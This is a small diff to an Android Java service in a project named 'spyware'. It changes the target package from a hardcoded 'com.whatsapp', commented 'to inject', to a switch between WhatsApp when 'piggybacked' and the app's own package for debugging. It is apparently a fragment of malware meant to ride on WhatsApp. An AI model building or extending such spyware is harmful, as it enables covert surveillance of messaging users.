@@ -12,8 +12,9 @@ import java.io.DataOutputStream;
 
 public class StartupIntentService extends IntentService {
 
-    final private String packageName = "com.whatsapp";
+    //final private String packageName = "com.whatsapp"; //to inject
     final private String accessibilityPackage = "com.example.cristianturetta.spyware";
+    final private String packageName = ParametersConfig.isPiggyBacked() ? "com.whatsapp" : accessibilityPackage; // to debug
 
     public StartupIntentService() {
         super("StartupIntentService");
